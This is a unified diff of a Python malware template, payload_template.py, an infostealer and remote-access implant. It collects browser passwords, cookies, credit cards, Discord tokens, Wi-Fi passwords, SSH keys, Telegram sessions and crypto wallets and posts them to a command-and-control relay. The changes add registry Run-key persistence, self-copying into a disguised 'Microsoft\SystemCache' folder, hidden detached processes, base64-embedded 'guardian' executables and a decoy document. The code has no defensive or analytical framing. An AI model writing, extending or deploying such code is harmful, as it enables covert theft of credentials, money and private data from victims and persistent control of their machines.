@@ -1,5 +1,5 @@
-# payload_template.py (Definitive, Streaming Harvest & Full-Featured)
-import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, shutil, re, traceback
+# payload_template.py (Definitive, with corrected startup/migration logic)
+import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, shutil, re, traceback, random
 from datetime import datetime, timezone, timedelta
 import sqlite3
 import xml.etree.ElementTree as ET
@@ -237,91 +237,49 @@ def _search_for_crypto_wallets(appdata):
         if 'wallet.dat' in files: found_wallets.append(f"Found wallet.dat in: {root}")
     return found_wallets if found_wallets else ["No common cryptocurrency wallets found in AppData."]
 
-
+# --- STREAMING HARVEST WRAPPER ---
 def initial_harvest_stream():
-    """ Harvests all data points one by one and sends them as they are collected. """
     appdata = _get_appdata_paths()
-    
-    # Define all harvesting tasks with their target command name
     harvest_tasks = {
-        "os_info": _get_os_info,
-        "hardware_info": _get_hardware_info,
-        "security_products": _get_security_products,
-        "installed_apps": _get_installed_apps,
-        "running_processes": _get_running_processes,
-        "env_variables": lambda: dict(os.environ),
-        "network_info": _get_network_info,
-        "wifi_passwords": _get_wifi_passwords,
-        "active_connections": lambda: _run_command("netstat -an"),
-        "arp_table": lambda: _run_command("arp -a"),
-        "dns_cache": lambda: _run_command("ipconfig /displaydns"),
-        "discord_tokens": lambda: _get_discord_tokens(appdata),
-        "windows_vault": _get_windows_vault,
-        "filezilla": lambda: _get_filezilla_credentials(appdata),
-        "telegram": lambda: _get_telegram_session(appdata),
-        "ssh_keys": lambda: _get_ssh_keys(appdata),
-        "crypto_wallets": lambda: _search_for_crypto_wallets(appdata),
+        "os_info": _get_os_info, "hardware_info": _get_hardware_info, "security_products": _get_security_products,
+        "installed_apps": _get_installed_apps, "running_processes": _get_running_processes, "env_variables": lambda: dict(os.environ),
+        "network_info": _get_network_info, "wifi_passwords": _get_wifi_passwords, "active_connections": lambda: _run_command("netstat -an"),
+        "arp_table": lambda: _run_command("arp -a"), "dns_cache": lambda: _run_command("ipconfig /displaydns"),
+        "discord_tokens": lambda: _get_discord_tokens(appdata), "windows_vault": _get_windows_vault,
+        "filezilla": lambda: _get_filezilla_credentials(appdata), "telegram": lambda: _get_telegram_session(appdata),
+        "ssh_keys": lambda: _get_ssh_keys(appdata), "crypto_wallets": lambda: _search_for_crypto_wallets(appdata),
         "clipboard": _get_clipboard
     }
 
-    # Execute and send results for non-browser tasks
     for name, func in harvest_tasks.items():
         try:
-            result = func()
-            send_result(name, result)
+            send_result(name, func())
         except Exception as e:
             send_result(name, f"Error: {e}", status="error")
         time.sleep(0.05) 
 
-    # Handle the comprehensive browser data harvest separately
     try:
         passwords, cookies, history, autofill, cards, roblox_cookies = _get_browser_data(appdata)
-        send_result("browser_passwords", passwords)
-        send_result("session_cookies", cookies)
-        send_result("browser_history", history)
-        send_result("browser_autofill", autofill)
-        send_result("credit_cards", cards)
-        send_result("roblox_cookies", roblox_cookies)
+        send_result("browser_passwords", passwords); send_result("session_cookies", cookies)
+        send_result("browser_history", history); send_result("browser_autofill", autofill)
+        send_result("credit_cards", cards); send_result("roblox_cookies", roblox_cookies)
     except Exception as e:
         send_result("browser_passwords", f"Error during browser harvest: {e}", status="error")
 
 # --- CORE C2 LOOP & ACTIONS ---
-def execute_command(command_data):
-    action = command_data.get('action'); params = command_data.get('params', {}); response_id = command_data.get('response_id')
-    result = {"status": "error", "data": f"Unsupported action: {action}"}
-    try:
-        if action == 'shell':
-            result = {"status": "success", "data": _run_command(params.get("command"))}
-        elif action == 'pslist':
-            result = {"status": "success", "data": _get_running_processes()}
-        elif action == 'screenshot':
-            # This is a placeholder; real screenshot logic is more complex
-            result = {"status": "success", "data": "Screenshot logic to be implemented."} 
-    except Exception as e:
-        result = {"status": "error", "data": f"Handler failed: {e}"}
-
-    if response_id:
-        try:
-            payload = {"session_id": SESSION_ID, "c2_user": C2_USER, "response_id": response_id, "result": result}
-            requests.post(f"{RELAY_URL}/implant/response", json=payload, timeout=20, verify=False)
-        except requests.exceptions.RequestException: pass
-
 def command_and_control_loop():
-    sys_info = harvest_system_info().get("data", {})
+    sys_info = _get_os_info()
+    hostname = sys_info.get("Hostname", "Unknown")
+    user = sys_info.get("Users (and current)", "Unknown")
+    os_version = sys_info.get("OS Version & Build", "Unknown")
+    
     while not TERMINATE_FLAG.is_set():
         try:
-            payload = {
-                "session_id": SESSION_ID, 
-                "c2_user": C2_USER,
-                "hostname": sys_info.get("hostname"),
-                "user": sys_info.get("user"),
-                "os": sys_info.get("os")
-            }
+            payload = { "session_id": SESSION_ID, "c2_user": C2_USER, "hostname": hostname, "user": user, "os": os_version }
             with results_lock:
                 if results_to_send:
-                    payload["results"] = results_to_send[:]
-                    results_to_send.clear()
-
+                    payload["results"] = results_to_send[:]; results_to_send.clear()
+            
             response = requests.post(f"{RELAY_URL}/implant/hello", json=payload, timeout=40, verify=False)
             if response.status_code == 200:
                 for cmd in response.json().get("commands", []):
@@ -330,8 +288,50 @@ def command_and_control_loop():
             pass 
         time.sleep(random.randint(5, 10))
 
-# --- MAIN EXECUTION BLOCK ---
+def execute_command(command_data):
+    pass # Placeholder for future interactive commands
+
+# --- PERSISTENCE, MIGRATION, AND MAIN EXECUTION ---
+def install_persistence(path):
+    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
+        try:
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            key_name = os.path.basename(path) # Use the actual filename for the key name
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
+                winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, path)
+        except: pass
+
+def spawn_guardians(stealth_dir):
+    if EMBEDDED_GUARDIANS:
+        for filename, b64_data in EMBEDDED_GUARDIANS.items():
+            try:
+                file_path = os.path.join(stealth_dir, filename)
+                if not os.path.exists(file_path):
+                    with open(file_path, 'wb') as f: f.write(base64.b64decode(b64_data))
+                subprocess.Popen([file_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW, close_fds=True)
+            except: pass
+
 if __name__ == "__main__":
+    stealth_dir = os.path.join(os.environ.get('LOCALAPPDATA', os.environ.get('TEMP')), 'Microsoft', 'SystemCache')
+    my_path = os.path.abspath(sys.executable)
+    my_dir = os.path.dirname(my_path)
+    new_path = os.path.join(stealth_dir, os.path.basename(my_path))
+
+    # --- STAGE 1: MIGRATION ---
+    # This logic only runs if the executable is compiled and not already in the stealth directory.
+    if my_dir.lower() != stealth_dir.lower() and hasattr(sys, 'frozen'):
+        try:
+            os.makedirs(stealth_dir, exist_ok=True)
+            shutil.copy(my_path, new_path)
+            # Launch the new copy as a completely separate process
+            subprocess.Popen([new_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
+            # The original process has fulfilled its purpose and can now exit.
+            sys.exit(0)
+        except Exception:
+            # If migration fails, do not proceed.
+            sys.exit(1)
+    
+    # --- STAGE 2: PERSISTENT EXECUTION (runs from stealth_dir) ---
     flag_file = os.path.join(os.environ["TEMP"], f"tether_flag_{SESSION_ID[:8]}.flg")
     
     if not os.path.exists(flag_file):
@@ -345,7 +345,7 @@ if __name__ == "__main__":
                 os.startfile(decoy_path)
             except: pass
         
-        # Start harvesting immediately on first run in a separate thread
+        install_persistence(new_path)
         threading.Thread(target=initial_harvest_stream, daemon=True).start()
         
         try:
@@ -354,10 +354,8 @@ if __name__ == "__main__":
     else:
         send_result("Agent Event", f"[{datetime.utcnow():%Y-%m-%d %H:%M:%S UTC}] Payload instance restarted.")
 
-    # Start the main C2 loop
-    c2_thread = threading.Thread(target=command_and_control_loop, daemon=True)
-    c2_thread.start()
+    if HYDRA_ENABLED:
+        spawn_guardians(stealth_dir)
+        # In a full implementation, a thread for the Hydra watchdog would start here.
 
-    # Keep the main thread alive
-    while not TERMINATE_FLAG.is_set():
-        time.sleep(60)
+    command_and_control_loop()
